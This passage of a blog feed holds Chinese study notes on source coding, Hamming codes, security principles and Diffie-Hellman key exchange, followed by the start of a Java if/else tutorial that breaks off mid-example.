采样定理</h3><p>信源有两种，离散源和模拟源（连续源）</p><p>1、为了使数字电路能够处理模拟信号，必须将模拟信号转成数字信号。将模拟信号到数字信号的转换称为模-数转换（A/D）。实现A/D的电路称为ADC。</p><p>2、模拟信号与数字信号之间的桥梁是什么呢？什么时候它们可以相互转换呢？</p><p>---回忆一下你在地铁里见到的广告牌？<del>啥意思？我也没看懂😮😮</del></p><p>--- 回忆一下你在纸上按照“点”描摹一条曲线</p><p>采样定理：<span class="math inline">\(f_s≥2f_{amax}\)</span></p><p><span class="math inline">\(f_s\)</span>为采样频率， <spanclass="math inline">\(f_{amax}\)</span>为奈奎斯特频率，它是模拟信号中的最高频率成分(谐波)</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171532196.png"alt="image-20231117153211124" /><figcaption aria-hidden="true">image-20231117153211124</figcaption></figure><h3 id="量化和编码">2.2 量化和编码</h3><p>通过采样后，我们得到了一个离散的数值。因为得到的数值有可能有无穷多位的小数，所以总是要进行近似，这个近似的过程就称为量化</p><p><strong>量化</strong>：将采样的数值用一个最小单元的整数倍来表示。这个最小单元记为Δ</p><p><strong>编码</strong>：将量化后的数值用二进制代码表示的过程。</p><p>量化误差：在量化过程中（数值近似），不可避免地会引入误差。不同的量化方法引入的量化误差不同。</p><h3 id="信源编码">2.3 信源编码</h3><blockquote><p>编码？说白了就是取名字（给信号或消息等取名字）</p><p>将一号给予班长，二号给予学委，三号….对A,B两个字母编码，可分别为0,1….</p></blockquote><h4 id="举例">举例</h4><p>某事件有四种可能，你会如何对这四种情况进行编码？ <spanclass="math display">\[\begin{array}{|l|l|}\hline X &amp; P(x) \\\hline \text { a } &amp; 0.6 \\\hline \text { b } &amp; 0.39 \\\hline \text { c } &amp; 0.009 \\\hline \text { d } &amp; 0.001 \\\hline\end{array}\]</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171648677.png"alt="image-20231117164758584" /><figcaption aria-hidden="true">image-20231117164758584</figcaption></figure><p>码1是否可行？ 可行</p><p>码2是否可行？0010，译码是否唯一？不可行</p><p>码3是否可行？可行，但是当我们收到一串码符号10时，我们能否判断该码字是否传完？所以还是不建议这样</p><p>码4是否可行？</p><ul><li>当收到一串码符号01时，能否判断该码字是否传完？出现00，能否判断？</li><li>第一问答案是肯定的。因为只要出现1，对应的码字就结束了。第二问的答案也是肯定的。没有出现1，则该码字还没有传完。</li><li>码4在译码时无需依赖于后续的码符号就可以判断该码字有没传完。这种类型的码就是即时码。</li></ul><p>对所选编码的要求：</p><ul><li>唯一可译性（必须满足）</li><li>即时性（尽量满足）</li></ul><p>目前满足以上两个要求的码有码1和码4，请问实际中你会选哪一种，为什么？</p><p>计算码1的平均长度，答案：2</p><p>计算码4的平均长度，答案：1×0.6 + 2×0.39 + 3×0.009 + 4×0.001 = 1.411&lt; 2</p><p>以上例子告诉我们一个什么道理？<strong>概率越大，码元编码越短，则信源的平均编码长度越短</strong></p><p><strong><em>这就是数据压缩的原理！</em></strong></p><h4 id="huffman码哈夫曼编码">Huffman码(哈夫曼编码)</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011516231.png"alt="霍夫曼码的定义" /><figcaption aria-hidden="true">霍夫曼码的定义</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011520803.png"alt="例题1" /><figcaption aria-hidden="true">例题1</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011521450.png"alt="解决方案1" /><figcaption aria-hidden="true">解决方案1</figcaption></figure><p><span class="math inline">\(\overline L\)</span>为平均长度</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011523348.png"alt="解决方案2" /><figcaption aria-hidden="true">解决方案2</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011523108.png"alt="两种方案的对比" /><figcaption aria-hidden="true">两种方案的对比</figcaption></figure><p>所以我们总是用第二种方法来进行哈夫曼编码</p><p><strong>Huffman码的特点：</strong></p><p>1、 Huffman码是最佳码（在所有码中平均码长最小）</p><p>2、概率大的符号对应于短码，概率小的符号对应于长码</p><p>3、两个概率最小的码字具有相同的码长，且只有最后一位不同</p><h3 id="小结">2.4 小结</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011525963.png"alt="本章小结" /><figcaption aria-hidden="true">本章小结</figcaption></figure><h2 id="第三章-无线信道">第三章 无线信道</h2><ul><li><p>一条水管能输送多少自来水？</p></li><li><p>一条高压线能传输多少电？</p></li></ul><p>学完本章，我们能够回答一个问题：无线信道究竟能传输多少信息？</p><h3 id="无线信道模型">3.1 无线信道模型</h3><p>无线信道是该课程接下来所有内容的基础</p><p>无线信道最主要的特征：随时间、频率而发生强度和相位的变化</p><p>无线信道的变化可以粗略地分为两大类：大尺度衰落、小尺度衰落</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312011530153.png"alt="无线信道的变化" /><figcaption aria-hidden="true">无线信道的变化</figcaption></figure><p>大尺度衰落一般与路径损耗以及阴影有关，变化幅度较小，实际中主要影响的是基站的位置</p><p>小尺度衰落一般由多径和干扰引起，变化幅度剧烈，实际中主要影响传输的可靠性和有效性，是本课程研究的重点</p><h2 id="第四章-信道编码">第四章 信道编码</h2><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151413647.png"alt="无线通信系统的基本构成" /><figcaption aria-hidden="true">无线通信系统的基本构成</figcaption></figure><h3 id="香农定理">4.1 香农定理</h3><p><strong>有噪信道编码定理（香农第二定理）</strong></p><p>某一信道的信道容量为C。当信息传输速率<spanclass="math inline">\(R≤C\)</span>时，总能找到一种信道编码方法，使信道输出端的平均译码错误概率任意小。</p><p>结论：信道容量是在信道中可靠传输信息的最大信息传输速率。</p><p>问题：香农第二定理只告诉我们存在一种编码方式使错误概率趋于零，但却没有告诉我们这种编码具体是什么？当传输速率小于C时，采用什么方式进行编码可以实现香农第二定理呢？</p><p>答：信道纠错码</p><h3 id="纠错码">4.2 纠错码</h3><p><strong>基本概念1：</strong></p><p>有<span class="math inline">\(k\)</span>个信息，记为<spanclass="math inline">\(m=(m_{k-1},m_{k-2},…,m_0)\)</span>。称m为信息组，<spanclass="math inline">\(m_i\)</span>为信息元</p><p>这k个信息元一共有<spanclass="math inline">\(2^k\)</span>种组合方式（二元通信系统）</p><p>为了纠错，在<spanclass="math inline">\(k\)</span>个信息的基础上引入额外的<spanclass="math inline">\(r\)</span>个符号（称为校验元），形成 <spanclass="math inline">\(n=k+r\)</span> 长的序列，并记为<spanclass="math inline">\(C=(c_{n-1},c_{n-2},…,c_0)\)</span>，称<spanclass="math inline">\(C\)</span>为码字， <spanclass="math inline">\(c_i\)</span>为码元，<spanclass="math inline">\(n\)</span>是码长，<spanclass="math inline">\(k\)</span>是信息元的个数，<spanclass="math inline">\(n-k=r\)</span>是校验元的个数</p><ul><li><p>如果增加的<spanclass="math inline">\(r\)</span>个校验元只与本组的<spanclass="math inline">\(k\)</span>个信息元有关，而与其他信息组无关，则这样的码称为分组码，记为(n,k)码。</p></li><li><p>如果增加的<spanclass="math inline">\(r\)</span>个校验元不仅与本组的<spanclass="math inline">\(k\)</span>个信息元有关，还与之前的信息组有关，则这样的码称为卷积码。</p></li><li><p>对二进制<span class="math inline">\((n,k)\)</span>线性分组码<span class="math inline">\(C\)</span> ，<spanclass="math inline">\(k\)</span>个信息元对应产生 <spanclass="math inline">\(2^k\)</span>个许用码字，其他<spanclass="math inline">\(2^n- 2^k\)</span>个为禁用码字。</p></li></ul><p><strong>基本概念2：码字的汉明重量、汉明距离</strong></p><p>码字的汉明重量是指码字中非零码元的个数，记为<spanclass="math inline">\(W(C)\)</span>。对于二元码，汉明重量就是<spanclass="math inline">\(1\)</span>的个数。</p><p>因此, 两个码字 <span class="math inline">\(C_k\)</span> 和 <spanclass="math inline">\(C_j\)</span> 之间的汉明距离为 <spanclass="math display">\[D\left(C_k, C_j\right)=W\left(C_k \oplus C_j\right)\]</span> <span class="math inline">\(\oplus\)</span> 表示模二相加,或者异或</p><p><span class="math display">\[\begin{array}{r}\text {1101与1010之间的汉明距离: } \\1101 \\+1010 \\\hline 0111\end{array}\]</span></p><p><strong>基本概念3：错误图样</strong> <span class="math display">\[E=\left(e_{n-1} e_{n-2} \cdots e_0\right)\]</span></p><p>当 <span class="math inline">\(e_i=0\)</span> 时，表示第 <spanclass="math inline">\(\mathrm{i}\)</span> 位无差错发生； <spanclass="math inline">\(e_i=1\)</span> 时，表示第 <spanclass="math inline">\(\mathrm{i}\)</span> 位出错</p><p>假设传输的序列为 <span class="math inline">\(C\)</span>, 接收的序列为<span class="math inline">\(R\)</span>, 则 <span class="math display">\[E=C \oplus R \quad R=C \oplus E \quad C=R \oplus E\]</span></p><p>即，任意两个的模二和等于第三个</p><p><span class="math inline">\(W(E)\)</span> 就表示出现错误的个数。</p><p>发送1101，接收1010，判断哪些位出错：后三位都有错误</p><h3 id="线性分组码">4.3 线性分组码</h3><blockquote><p>定义：线性分组码是指分组码中信息元和校验元是用线性方程联系起来的一种差错控制码</p></blockquote><p>线性分组码的构成步骤：</p><p>1、信道编码器将信息序列分成 <span class="math inline">\(k\)</span>长的信息组, 记为 <spanclass="math inline">\(\mathrm{m}=\left(\mathrm{m}_{\mathrm{k}-1},\mathrm{~m}_{\mathrm{k}-2}, \ldots, \mathrm{m}_0\right)\)</span> 。</p><p>2、用 <span class="math inline">\(\mathrm{k}\)</span>个信息元线性组合产生 <span class="math inline">\(\mathrm{r}\)</span>个校验元</p><p>3、将 <span class="math inline">\(k\)</span> 个信息元与 <spanclass="math inline">\(\mathrm{r}\)</span> 个校验元组合成长度为 <spanclass="math inline">\(n\)</span> 的码字 <spanclass="math inline">\(\mathrm{C}=\left(\mathrm{c}_{\mathrm{n}-1},\mathrm{c}_{\mathrm{n}-2}, \ldots, \mathrm{c}_0\right)\)</span></p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151427463.png"alt="线性分组码" /><figcaption aria-hidden="true">线性分组码</figcaption></figure><h3 id="汉明码">4.4 汉明码</h3><blockquote><p>最简单的线性分组码：汉明码</p></blockquote><p>汉明码可以用来纠正 1 比特错误</p><p>汉明码的核心在于两个矩阵：生成矩阵G和校验矩阵H</p><ul><li>生成矩阵G用来生成码字</li><li>校验矩阵H用来验证某个码字是否传输正确</li></ul><h4 id="一生成矩阵">一、生成矩阵</h4><p>（用来生成码字）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151430772.png"alt="生成矩阵" /><figcaption aria-hidden="true">生成矩阵</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151431837.png"alt="生成矩阵" /><figcaption aria-hidden="true">生成矩阵</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312151432782.png"alt="生成矩阵" /><figcaption aria-hidden="true">生成矩阵</figcaption></figure><p>下面是信息论与编码中的一点东西</p><p>（7，4）汉明码的标准校验矩阵</p><p><span class="math display">\[\begin{aligned}&amp;\begin{array}{|l|l|l|l|l|l|l|l|l|}\hline s 0=000 &amp; \mathrm{c} 0=0000000 &amp; \mathrm{c} 1=0001011&amp; \mathrm{c} 2=0010110 &amp; \mathrm{c} 3=0011101 &amp; \mathrm{c}4=0100111 &amp; \mathrm{c5}=0101100 &amp; \mathrm{c} 6=0110001 &amp;\mathrm{c} 7=0111010 \\\hline \mathrm{s} 1=101 &amp; \mathrm{e} 1=1000000 &amp; 1001011 &amp;1010110 &amp; 1011101 &amp; 1100111 &amp; 1101100 &amp; 1110001 &amp;1111010 \\\mathrm{~s} 2=111 &amp; \mathrm{e} 2=0100000 &amp; 0101011 &amp; 0110110&amp; 0111101 &amp; 0000111 &amp; 0001100 &amp; 0010001 &amp; 0011010 \\\mathrm{~s} 3=110 &amp; \mathrm{e} 3=0010000 &amp; 0011011 &amp; 0000110&amp; 0001101 &amp; 0110111 &amp; 0111100 &amp; 0100001 &amp; 0101010 \\\mathrm{~s} 4=011 &amp; \mathrm{e} 4=0001000 &amp; 0000011 &amp; 0011110&amp; 0010101 &amp; 0101111 &amp; 0100100 &amp; 0111001 &amp; 0110010 \\\mathrm{~s} 5=100 &amp; \mathrm{e} 5=0000100 &amp; 0001111 &amp; 0010010&amp; 0011001 &amp; 0100011 &amp; 0101000 &amp; 0110101 &amp; 011110 \\\mathrm{~s} 6=010 &amp; \mathrm{e} 6=0000010 &amp; 0001001 &amp; 0010100&amp; 0011111 &amp; 0100101 &amp; 0101110 &amp; 0110011 &amp; 0111000 \\\mathrm{~s} 7=001 &amp; \mathrm{e} 7=0000001 &amp; 0001010 &amp; 0010110&amp; 0011100 &amp; 0100110 &amp; 0101101 &amp; 0110000 &amp; 0111011 \\\hline\end{array}\\&amp;\begin{array}{|l|l|l|l|l|l|l|l|l|}\hline s 0=000 &amp; c 8=1000101 &amp; c 9=1001110 &amp; c 10=1010011&amp; c 11=1011000 &amp; c 12=1100010 &amp; c 13=1101001 &amp; c14=1110100 &amp; c 15=1111111 \\\hline s 1=101 &amp; 0000101 &amp; 0001110 &amp; 0010011 &amp; 0011000&amp; 0100010 &amp; 0101001 &amp; 0110100 &amp; 0111111 \\s 2=111 &amp; 1100101 &amp; 1101110 &amp; 1110011 &amp; 1111000 &amp;1000010 &amp; 1001001 &amp; 1010100 &amp; 1011111 \\s 3=110 &amp; 1010101 &amp; 1011110 &amp; 1000011 &amp; 1001000 &amp;1110010 &amp; 1111001 &amp; 1100100 &amp; 1101111 \\s 4=011 &amp; 1001101 &amp; 1000110 &amp; 1011011 &amp; 1010000 &amp;1101010 &amp; 1100001 &amp; 1111100 &amp; 1110111 \\s 5=100 &amp; 1000001 &amp; 1001010 &amp; 1010111 &amp; 1011100 &amp;1100110 &amp; 1101101 &amp; 1110000 &amp; 1111011 \\s 6=010 &amp; 1000111 &amp; 1001100 &amp; 1010001 &amp; 1011010 &amp;1100000 &amp; 1101011 &amp; 1110110 &amp; 1111101 \\s 7=001 &amp; 1000100 &amp; 1001111 &amp; 1010010 &amp; 1011001 &amp;1100011 &amp; 1101000 &amp; 1110101 &amp; 1111110 \\\hline\end{array}\end{aligned}\]</span></p><p>……</p><p>……</p><p>……</p><p>……</p><h2 id="第十章-无线通信安全">第十章 无线通信安全</h2><p>通信：</p><p>有线：光纤</p><p>无线：</p><ul><li>光通信</li><li>分子通信——药物</li><li>量子通信</li></ul><h3 id="安全性原则">安全性原则</h3><p>假设A要通过信封向B邮寄一个100元的支票。通常，A和B会考虑什么因素？</p><p>A要保证只有B能收到信封，即使别人收到，也不知道支票的细节。这是<strong>保密性原则</strong></p><p>A和B还要保证别人不会篡改支票内容（如金额、日期、签名、收款人等）。这是<strong>完整性原则</strong></p><p>B要保证支票是来自A，而不是别人假装A（否则就是假支票）。这是<strong>认证原则</strong>。</p><p>如果B把支票转入账号中，钱从A账户转到B账户之后，A否认签发了支票呢？法院要用A的签名否认A的抵赖，解决争端。这是<strong>不可抵赖性原则</strong>。</p><h4 id="保密性">保密性</h4><p>保密性要求做到只有发送人和期望接收人才能访问消息内容。如果非法人员能够访问消息内容，则破坏了保密性原则。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171424504.png"alt="image-20231117142405434" /><figcaption aria-hidden="true">image-20231117142405434</figcaption></figure><p>例如该图中，A向B发送一封邮件，C未经B的允许却可以进行访问。这种攻击称为截获（Interception）</p><h4 id="认证">认证</h4><p>认证机制用于证明身份。例如，用户C假装成用户A向B发送转账请求（实际收款账户是C的而不是A的），B以为这是A的请求，于是错误地将钱打给C。这种攻击称为伪造(fabrication)</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171425490.png"alt="image-20231117142504430" /><figcaption aria-hidden="true">image-20231117142504430</figcaption></figure><h4 id="完整性">完整性</h4><p>消息内容在发送方发出后到达期望接收方时发生改变，就会失去消息的完整性。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171425051.png"alt="image-20231117142530983" /><figcaption aria-hidden="true">image-20231117142530983</figcaption></figure><p>C篡改了A发送的信息，然后将改变的信息发给B。A，B都不知道消息被篡改。这种攻击称为篡改(modification)</p><h4 id="不可抵赖">不可抵赖</h4><p>有时用户发送了这个消息，又想否认发送了这个消息。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171426920.png"alt="image-20231117142604861" /><figcaption aria-hidden="true">image-20231117142604861</figcaption></figure><p>例如，用户A向银行B发送一个转账请求。银行按A的请求转账之后，A声称没有发送这个转账请求</p><h3 id="无线通信的开放性">无线通信的开放性</h3><p>无线信道的开放性导致任何装有天线的用户都可以收到发送给其他用户的信息</p><p>这种特性被称为广播特性，例如，上课、讲座等</p><h3 id="信息论安全完美安全">信息论安全（完美安全）</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171427787.png"alt="image-20231117142757724" /><figcaption aria-hidden="true">image-20231117142757724</figcaption></figure><p>M是隐私信息（明文），K是密钥，C是M被K加密后的信息（密文）</p><p>香农证明：要实现完美安全，M与C必须满足如下关系：</p><p><span class="math display">\[I(M;C)=0  ---互信息\]</span></p><p>意味着窃听者收到C后得到关于M的信息量为0；又或者理解为M与C没有任何共有的信息。</p><p>加密的性质：知道了M，K，C 中的任何两个，第三个就会知道，因此：<spanclass="math inline">\(H(M|KC) = H(K|MC) = H(C|KM)=0\)</span></p><p>完美安全的条件：一次一密，即每一比特的隐私信息至少需要一比特的密钥进行加密</p><h4 id="互信息">互信息</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171438095.png"alt="image-20231117143815037" /><figcaption aria-hidden="true">image-20231117143815037</figcaption></figure><p><strong>熵 H(X)</strong>：熵的本质是不确定性的多少</p><p><strong>条件熵 H(X|Y)</strong>：已知Y后，X还剩下多少不确定性 <spanclass="math display">\[H(X \mid Y)=-\sum_i \sum_j P\left(x_i, y_j\right) \log P\left(x_j \midy_i\right)\]</span> 在没有收到Y时，X的不确定性为多少？ H(X)</p><p>在收到Y后，X的不确定性为多少？H(X|Y) 。<em>这个对 X尚存在的不确定性是由干扰（噪声）引起的。</em></p><p>在这个过程中，接收机获得了多少信息量？H(X)-H(X|Y)</p><p><strong>互信息</strong>： <span class="math display">\[I(X;Y)=H(X)-H(X|Y)\]</span>互信息I(X;Y)的本质：接收机获取来自发射机的信息量的多少。或者理解为：接收信号Y与发送信号X共有的信息量</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171444008.png"alt="image-20231117144412928" /><figcaption aria-hidden="true">image-20231117144412928</figcaption></figure><p>H(X|Y)：去掉包含Y的部分后，X剩下的不确定性</p><p>H(Y|X)：去掉包含X的部分后，Y剩下的不确定性</p><p>如果发送了X，接收机准确地获取了X，则得到的互信息为多少？H(X)</p><p>如果发送了X，收到了一个完全不相干的Y，则得到的互信息为多少？0</p><h3 id="diffie-hellman密钥交换协议">Diffie-Hellman密钥交换协议</h3><p>1976年，Diffie和Hellman这两个人提出了一种奇妙的密钥交换方法来解决通信双方密钥共享的问题。该方案是后续非对称密码学的基础</p><p>算法描述：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202311171517405.png"alt="image-20231117151709336" /><figcaption aria-hidden="true">image-20231117151709336</figcaption></figure><p>第一步：Alice和Bob公开两个大的素数n,g。意味着Alice，Bob，Eve都知道这两个数</p><p>第二步：Alice生成一个很大的数x（只有Alice自己知道），并计算<spanclass="math inline">\(A=g^x \bmod n\)</span></p><p>第三步：将A发送给Bob（意味着Bob，Eve都知道A）</p><p>第四步：Bob生成一个很大的数y（只有Bob自己知道），并计算<spanclass="math inline">\(B=g^y \bmod n\)</span></p><p>第五步：将B发送给Alice（意味着Alice，Eve都知道B）</p><p>第六步：Alice计算秘密密钥K1；Bob计算秘密密钥K2</p><p><span class="math display">\[\begin{align}&amp;K_1=B^x \bmod n----B是来自Bob，x是Alice生成\\&amp;K_2=A^y \bmod n----A是来自Alice，y是Bob生成\\\end{align}\]</span></p><p>证明1：K1=K2 <span class="math display">\[\begin{aligned} &amp; K 1=B^x \bmod n \\ &amp; \because B=g^y \bmod n \\&amp; \therefore g^y=r n+B(r \text { 是一个整数 }) \\ &amp;\therefore\left(g^y\right)^x \bmod n=(r n+B)^x \bmod n=B^x \bmod n=K 1\\ &amp; K 1=g^{y x} \bmod n \\ &amp; K 2=g^{x y} \bmod n \\ &amp; K 1=K2=K\end{aligned}\]</span> 证明2：Eve很难算出K</p><p>Eve要解出K，必须知道x或者y，<span class="math inline">\(K_1=B^x \bmodn\)</span>，<span class="math inline">\(K_2=A^y \bmod n\)</span></p><p>而要算出x和y只能从以下两个方程入手：<span class="math inline">\(A=g^x\bmod n\)</span>，<span class="math inline">\(B=g^y \bmod n\)</span></p><p>因为x,y是整数且n很大，从这两个方程求出x和y非常困难</p><p>看个小例子：<span class="math inline">\(2=3^y \bmod17\)</span>，遍历得<span class="math inline">\(x=14\)</span></p>]]></content>
    
    
    
    <tags>
      
      <tag>通信原理与安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>&lt;Java&gt; 4 程序控制结构</title>
    <link href="/2023/11/15/Java%204%20%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/"/>
    <url>/2023/11/15/Java%204%20%E7%A8%8B%E5%BA%8F%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<blockquote><p>程序运行的流程控制决定程序是如何执行的，是我们必须掌握的。主要分为：顺序控制、分支控制、循环控制。</p></blockquote><h2 id="顺序控制">4.1 顺序控制</h2><blockquote><p>程序从上到下逐行执行，中间没有任何判断和跳转（默认的控制顺序）</p><p>比如：Java 定义变量时采用合法的前向引用。</p></blockquote><p>语句：Java 中最小的执行单位。语句分为 单语句 和 复合语句。</p><ul><li><p>单语句：通常意义的一条语句。语句间以分号 <code>;</code>分隔。</p></li><li><p>复合语句：一对大括号括起来的语句组。也称为 “块”</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&#123;<br>    语句<span class="hljs-number">1</span><span class="hljs-comment">; </span><br>    语句<span class="hljs-number">2</span><span class="hljs-comment">;</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>块中可以有多条语句。块后没有分号 <code>;</code></p></li></ul><h2 id="分支控制-if-else">4.2 分支控制 <code>if-else</code></h2><blockquote><p>让程序有选择的执行。主要分为：单分支控制、双分支控制</p></blockquote><h3 id="单分支控制">4.2.1 单分支控制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (条件表达式) 语句;<br></code></pre></td></tr></table></figure><p>特别地，把代码块（复合语句）作为语句的场合也能这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (条件表达式) &#123;<br> 执行代码块;<br>&#125;<br></code></pre></td></tr></table></figure><p>当条件表达式为 <code>ture</code>，就会执行<code>&#123;执行代码块;&#125;</code>；如果为 <code>false</code>则不执行。特别地：如果 <code>&#123;执行代码块;&#125;</code>中只有一条代码，也可以不写 <code>&#123; &#125;</code>（但还是建议写上）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">If01</span> &#123;<br>    <span class="hljs-comment">//编写一个 main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//编写一个程序,可以输入人的年龄,如果该同志的年龄大于 18 岁, 则输出 &quot;你年龄大于 18,要对自己的行为负责,送入监狱&quot;</span><br>        <span class="hljs-comment">//思路分析</span><br>        <span class="hljs-comment">//1. 接收输入的年龄, 应该定义一个 Scanner 对象</span><br>        <span class="hljs-comment">//2. 把年龄保存到一个变量 int age</span><br>        <span class="hljs-comment">//3. 使用 if 判断，输出对应信息</span><br>        <span class="hljs-comment">//应该定义一个 Scanner 对象</span><br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入年龄:&quot;</span>);<br>        <span class="hljs-comment">//把年龄保存到一个变量 int age</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br>        <span class="hljs-comment">//使用 if 判断，输出对应信息</span><br>        <span class="hljs-keyword">if</span>(age &gt; <span class="hljs-number">18</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;你年龄大于 18,要对自己的行为负责,送入监狱&quot;</span>);<br>        &#125;<br>        <br>        System.out.println(<span class="hljs-string">&quot;程序继续...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="双分支控制">4.2.2 双分支控制</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (条件表达式) &#123;<br>执行代码块;<br>&#125; <br><span class="hljs-keyword">else</span> &#123;<br>执行代码块<span class="hljs-number">2</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当条件表达式为 <code>ture</code>，就会执行<code>&#123;执行代码块1;&#125;</code>；如果为 <code>false</code> 则执行<code>&#123;执行代码块2;&#125;</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-comment">//编写一个 main 方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//判断一个年份是否是闰年，闰年的条件是符合下面二者之一：</span><br>        <span class="hljs-comment">//(1)年份能被 4 整除，但不能被 100 整除；(2)能被 400 整除</span><br>        <span class="hljs-comment">//思路分析</span><br>        <span class="hljs-comment">//1. 定义 int year 保存年</span><br>        <span class="hljs-comment">//2. 年份能被 4 整除，但不能被 100 整除, // =&gt; year % 4 == 0 &amp;&amp; year % 100 != 0</span><br>        <span class="hljs-comment">//3. 能被 400 整除 =&gt; year % 400 == 0</span><br>        <span class="hljs-comment">//4. 上面的 2 和 3 是 或的关系</span><br>        <span class="hljs-comment">//代码实现</span><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入年份：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">year</span> <span class="hljs-operator">=</span> myScanner.nextInt();<br>        <span class="hljs-keyword">if</span>( (year % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> &amp;&amp; year % <span class="hljs-number">100</span> != <span class="hljs-number">0</span>) || year % <span class="hljs-number">400</span> == <span class="hljs-number">0</span> ) &#123;<br>            System.out.println(year + <span class="hljs-string">&quot; 是 闰年&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(year + <span class="hljs-string">&quot; 不是 闰年&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="多分支控制">4.2.3 多分支控制</h3><figure class="highlight java"><table><tr><td 